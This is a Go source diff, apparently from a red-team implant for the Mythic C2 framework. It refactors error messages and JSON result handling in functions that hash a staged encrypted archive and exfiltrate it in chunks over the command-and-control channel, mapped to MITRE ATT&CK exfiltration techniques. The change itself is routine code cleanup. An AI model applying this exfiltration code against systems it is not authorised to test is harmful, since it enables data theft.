@@ -17,20 +17,20 @@ import (
 // MITRE ATT&CK: T1041 (Exfiltration Over C2 Channel), T1048 (Exfiltration Over Alternative Protocol)
 func compressExfil(task structs.Task, params CompressParams) structs.CommandResult {
 	if params.Path == "" {
-		return errorResult("Error: 'path' is required for exfil action (path to staged archive)")
+		return errorResult("'path' is required for exfil action (path to staged archive)")
 	}
 
 	archivePath, err := filepath.Abs(params.Path)
 	if err != nil {
-		return errorf("Error resolving path: %v", err)
+		return errorf("resolving path: %v", err)
 	}
 
 	info, err := os.Stat(archivePath)
 	if err != nil {
-		return errorf("Error accessing archive: %v", err)
+		return errorf("accessing archive: %v", err)
 	}
 	if info.IsDir() {
-		return errorResult("Error: path must be a file, not a directory. Use 'compress stage' first to create an encrypted archive.")
+		return errorResult("path must be a file, not a directory. Use 'compress stage' first to create an encrypted archive.")
 	}
 
 	fileSize := info.Size()
@@ -38,7 +38,7 @@ func compressExfil(task structs.Task, params CompressParams) structs.CommandResu
 	// Compute SHA-256 of the entire file for integrity verification
 	file, err := os.Open(archivePath)
 	if err != nil {
-		return errorf("Error opening archive: %v", err)
+		return errorf("opening archive: %v", err)
 	}
 
 	hasher := sha256.New()
@@ -61,7 +61,7 @@ func compressExfil(task structs.Task, params CompressParams) structs.CommandResu
 	// Seek back to start for transfer
 	if _, err := file.Seek(0, 0); err != nil {
 		file.Close()
-		return errorf("Error seeking archive: %v", err)
+		return errorf("seeking archive: %v", err)
 	}
 
 	// Transfer to Mythic via chunked file download channel
@@ -97,12 +97,11 @@ func compressExfil(task structs.Task, params CompressParams) structs.CommandResu
 				CleanedUp:   cleanedUp,
 				Status:      "transferred",
 			}
-			metadataJSON, _ := json.Marshal(metadata)
-			return structs.CommandResult{
-				Output:    string(metadataJSON),
-				Status:    "success",
-				Completed: true,
+			metadataJSON, err := json.Marshal(metadata)
+			if err != nil {
+				return errorf("failed to marshal result: %v", err)
 			}
+			return successResult(string(metadataJSON))
 		case <-time.After(1 * time.Second):
 			if task.DidStop() {
 				file.Close()
@@ -134,7 +133,7 @@ func compressStageExfil(task structs.Task, params CompressParams) structs.Comman
 	// Step 2: Parse staging metadata to get archive path
 	var staged stageMetadata
 	if err := json.Unmarshal([]byte(stageResult.Output), &staged); err != nil {
-		return errorf("Error parsing stage metadata: %v", err)
+		return errorf("parsing stage metadata: %v", err)
 	}
 
 	// Step 3: Exfil the staged archive
@@ -151,7 +150,7 @@ func compressStageExfil(task structs.Task, params CompressParams) structs.Comman
 	// Step 4: Build combined metadata
 	var exfil exfilMetadata
 	if err := json.Unmarshal([]byte(exfilResult.Output), &exfil); err != nil {
-		return errorf("Error parsing exfil metadata: %v", err)
+		return errorf("parsing exfil metadata: %v", err)
 	}
 
 	combined := stageExfilMetadata{
@@ -166,13 +165,12 @@ func compressStageExfil(task structs.Task, params CompressParams) structs.Comman
 		CleanedUp:     exfil.CleanedUp,
 		Status:        "staged_and_transferred",
 	}
-	combinedJSON, _ := json.Marshal(combined)
-
-	return structs.CommandResult{
-		Output:    string(combinedJSON),
-		Status:    "success",
-		Completed: true,
+	combinedJSON, err := json.Marshal(combined)
+	if err != nil {
+		return errorf("failed to marshal result: %v", err)
 	}
+
+	return successResult(string(combinedJSON))
 }
 
 // stageExfilMetadata holds the combined result of stage + exfil.
